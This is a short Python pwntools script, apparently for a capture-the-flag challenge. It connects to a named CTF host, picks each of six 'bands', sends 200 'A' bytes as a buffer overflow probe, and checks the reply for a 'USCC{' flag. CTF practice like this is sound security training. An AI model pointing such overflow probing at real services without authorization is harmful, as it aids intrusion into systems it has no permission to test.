#!/usr/bin/env python3
from pwn import *

# Context settings
context.log_level = 'info'

host = "chals.uscc-cyberbowl-2025.ctf.institute"
port = 3015

def test_with_extra_input(band):
    print(f"\n{'='*60}")
    print(f"Testing band {band} with extra input")
    print(f"{'='*60}")
    
    try:
        conn = remote(host, port, timeout=10)
        
        # Receive prompt
        conn.recvuntil(b":")
        
        # Send band
        conn.sendline(str(band).encode())
        
        # Try to receive response
        try:
            data = conn.recv(timeout=2)
            print(f"Response after band selection: {data.decode('utf-8', errors='ignore')}")
        except:
            print("No immediate response")
        
        # Try sending additional input (buffer overflow attempt)
        payload = b"A" * 200
        conn.send(payload)
        
        # Try to receive more
        try:
            data = conn.recvall(timeout=3)
            output = data.decode('utf-8', errors='ignore')
            print(f"Response after payload: {output}")
            
            if 'USCC{' in output or 'RAIDER' in output:
                print("\n" + "!"*60)
                print("INTERESTING OUTPUT FOUND!")
                print("!"*60)
                return True
        except:
            pass
        
        conn.close()
        return False
        
    except Exception as e:
        print(f"Error: {e}")
        return False

# Test all bands
for band in range(1, 7):
    if test_with_extra_input(band):
        break
